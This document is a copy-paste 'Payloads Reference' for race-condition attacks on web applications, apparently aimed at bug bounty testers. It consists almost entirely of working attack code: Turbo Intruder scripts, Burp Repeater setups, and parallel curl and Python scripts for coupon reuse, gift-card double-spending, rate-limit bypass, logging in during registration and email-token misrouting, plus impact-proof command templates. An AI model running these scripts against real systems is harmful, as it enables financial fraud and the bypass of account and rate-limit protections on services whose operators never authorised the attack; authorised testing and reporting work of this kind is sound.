# Payloads Reference

All scripts are copy-paste ready. Replace TARGET, SESSION, and payload values.

---

## Turbo Intruder Scripts

### Script 1: Basic Limit Overrun (HTTP/2 Single-Packet)

Use for: coupon reuse, gift card, rate limit bypass

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )
    
    # Warm up the connection
    engine.queue(target.req)
    
    import time
    time.sleep(0.5)
    
    # Queue 20 attack requests with same gate
    for i in range(20):
        engine.queue(target.req, gate='race')
    
    # Fire all simultaneously
    engine.openGate('race')

def handleResponse(req, interesting):
    # Flag any non-standard success responses
    if '200' in req.status and 'success' in req.response.lower():
        interesting = True
    table.add(req)
```

**In Burp:** Extensions → Turbo Intruder → paste script above → Attack

---

### Script 2: Basic Limit Overrun (HTTP/1.1 Last-Byte Sync)

Use when target is HTTP/1.1 only

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=1,
        pipeline=False,
        engine=Engine.HTTP1
    )
    
    for i in range(30):
        engine.queue(target.req, gate='race')
    
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

---

### Script 3: Multi-Endpoint Gate Attack

Use for: email change + verify race, payment + cart race

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=2,
        engine=Engine.BURP2
    )
    
    # Define Request A (e.g., change email)
    requestA = target.req  # Modify as needed in Burp
    
    # Define Request B (e.g., verify email with existing token)
    # Must be a complete raw HTTP request string
    requestB = '''POST /verify-email HTTP/2
Host: TARGET.COM
Cookie: session=YOUR_SESSION_TOKEN
Content-Type: application/json
Content-Length: 42

{"token":"VERIFICATION_TOKEN_HERE"}'''
    
    # Warm connection
    engine.queue(requestA)
    
    import time
    time.sleep(0.5)
    
    # Queue both to same gate (fire simultaneously)
    engine.queue(requestA, gate='race')
    engine.queue(requestB, gate='race')
    
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

---

### Script 4: Partial Construction — Registration Race

Use for: login during registration window

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=2,
        engine=Engine.BURP2
    )
    
    # Registration request
    registerReq = '''POST /register HTTP/2
Host: TARGET.COM
Content-Type: application/json
Content-Length: 65

{"username":"testuser123","email":"test@attacker.com","password":"Pass123!"}'''
    
    # Login attempt with same credentials (races against registration completion)
    loginReq = '''POST /login HTTP/2
Host: TARGET.COM
Content-Type: application/json
Content-Length: 51

{"username":"testuser123","password":"Pass123!"}'''
    
    # Send registration first, then immediately race login
    engine.queue(registerReq)
    
    import time
    time.sleep(0.05)  # 50ms delay — adjust based on response time
    
    # Queue multiple login attempts to hit partial state window
    for _ in range(10):
        engine.queue(loginReq, gate='race')
    
    engine.openGate('race')

def handleResponse(req, interesting):
    # Look for login success with unusual response (null role, no MFA, etc.)
    if '200' in req.status:
        interesting = True
    table.add(req)
```

---

### Script 5: Email Token Misrouting Detection

Use for: detecting token misrouting in email change flows

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=2,
        engine=Engine.BURP2
    )
    
    # Change email to attacker address 1
    req1 = target.req.replace('PLACEHOLDER_EMAIL', 'attacker1@evil.com')
    
    # Change email to attacker address 2 (same account, different endpoint call)
    req2 = target.req.replace('PLACEHOLDER_EMAIL', 'attacker2@evil.com')
    
    # Warm up
    engine.queue(req1)
    import time
    time.sleep(0.5)
    
    # Race both email changes simultaneously
    for _ in range(5):
        engine.queue(req1, gate='race')
        engine.queue(req2, gate='race')
    
    engine.openGate('race')
    
    # After attack: check BOTH inboxes for verification emails
    # If attacker1 receives email meant for attacker2 → misrouting found

def handleResponse(req, interesting):
    table.add(req)
```

---

### Script 6: High-Volume Parallel for Wide Race Window

Use for: distributed/microservice targets with wide race windows

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=50,
        requestsPerConnection=1,
        engine=Engine.BURP2
    )
    
    # Warm up
    for _ in range(3):
        engine.queue(target.req)
    
    import time
    time.sleep(1)
    
    # 50 simultaneous requests
    for i in range(50):
        engine.queue(target.req, gate='race')
    
    engine.openGate('race')

def handleResponse(req, interesting):
    if req.status != '400' and req.status != '429':
        interesting = True
    table.add(req)
```

---

## Burp Repeater Group Setups

### Setup 1: Quick Parallel Test (No Script Needed)

```
1. Capture target request → Send to Repeater
2. Right-click Repeater tab → "Add to new group"
3. Ctrl+R (duplicate) × 19 to get 20 identical tabs in group
4. Right-click group tab → "Send group in parallel (separate connections)"
5. Observe: how many responses say "success"?
6. If >1 success → race condition confirmed
```

### Setup 2: Single-Connection (Reduced Jitter)

```
1. Same setup as above
2. Instead: right-click group → "Send group in sequence (single connection)"
3. This sends all on same TCP connection — better timing for narrow windows
4. Works well for HTTP/1.1 targets
```

---

## curl Parallel Commands

```bash
# Quick 20-parallel test
seq 20 | xargs -P 20 -I{} \
  curl -s -w "%{http_code}\n" -o /tmp/response_{}.txt \
  -X POST "https://TARGET.COM/redeem" \
  -H "Cookie: session=YOUR_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"code":"PROMO20"}'

# Check results
grep -l "success" /tmp/response_*.txt | wc -l
# If count > 1 → race condition

# Multi-session variant (bypass session locking)
SESSIONS=("session_token_1" "session_token_2" "session_token_3")
for session in "${SESSIONS[@]}"; do
  curl -s -X POST "https://TARGET.COM/redeem" \
    -H "Cookie: session=$session" \
    -H "Content-Type: application/json" \
    -d '{"code":"PROMO20"}' &
done
wait

# Python: most control, best for complex multi-endpoint races
python3 << 'EOF'
import threading, requests, json

TARGET = "https://target.com/redeem"
SESSIONS = ["session1", "session2", "session3"]
RESULTS = []

def attack(session):
    r = requests.post(
        TARGET,
        headers={
            "Cookie": f"session={session}",
            "Content-Type": "application/json"
        },
        json={"code": "PROMO20"},
        timeout=10
    )
    RESULTS.append({
        "session": session,
        "status": r.status_code,
        "body": r.text[:200]
    })
    print(f"[{r.status_code}] {r.text[:100]}")

threads = [threading.Thread(target=attack, args=(s,)) for s in SESSIONS * 7]
[t.start() for t in threads]
[t.join() for t in threads]

successes = [r for r in RESULTS if r['status'] == 200 and 'success' in r['body'].lower()]
print(f"\n[+] {len(successes)} successful redemptions out of {len(RESULTS)} attempts")
EOF
```

---

## State Verification Commands

After attack, verify state was exploited:

```bash
# Check wallet/balance via API
curl -s "https://target.com/api/user/balance" \
  -H "Authorization: Bearer YOUR_TOKEN" | jq .balance

# Check coupon status (if API exposes it)
curl -s "https://target.com/api/coupons/PROMO20/status" \
  -H "Authorization: Bearer YOUR_TOKEN" | jq .

# Check order history for duplicates
curl -s "https://target.com/api/orders" \
  -H "Cookie: session=YOUR_SESSION" | jq '[.[] | {id, total, discount}]'
```

---

## Response Analysis Quick Reference

```
Count multiple "success" responses:
grep -c '"success":true' /tmp/response_*.txt

Find negative balance indicator:
grep -r '"balance":-' /tmp/response_*.txt

Find duplicate order IDs:
grep -oh '"orderId":"[^"]*"' /tmp/response_*.txt | sort | uniq -d

Check for different emails in parallel email-change attack:
# Monitor both attacker email inboxes simultaneously
# If inbox 1 receives token for inbox 2 email → misrouting confirmed
```

---

## Impact Proof Templates

Use these to demonstrate impact clearly in reports:

```bash
# Proof 1: Gift card double-spend
echo "=== Before Attack ==="
curl -s https://target.com/api/giftcard/CARD123 | jq .balance
echo "=== Sending 10 parallel redemptions ==="
seq 10 | xargs -P 10 -I{} curl -s -X POST https://target.com/redeem \
  -H "Cookie: session=SESSION" -d '{"code":"CARD123"}' -w "%{http_code}\n"
echo "=== After Attack ==="
curl -s https://target.com/api/wallet | jq .balance
# Screenshot balance before and after

# Proof 2: Coupon reuse — show total discount applied
echo "=== Cart total without coupon ===" && curl -s https://target.com/cart | jq .total
seq 20 | xargs -P 20 -I{} curl -s -X POST https://target.com/apply-coupon \
  -d '{"code":"SAVE10"}' -H "Cookie: session=SESSION"
echo "=== Cart total after race ===" && curl -s https://target.com/cart | jq .total
```
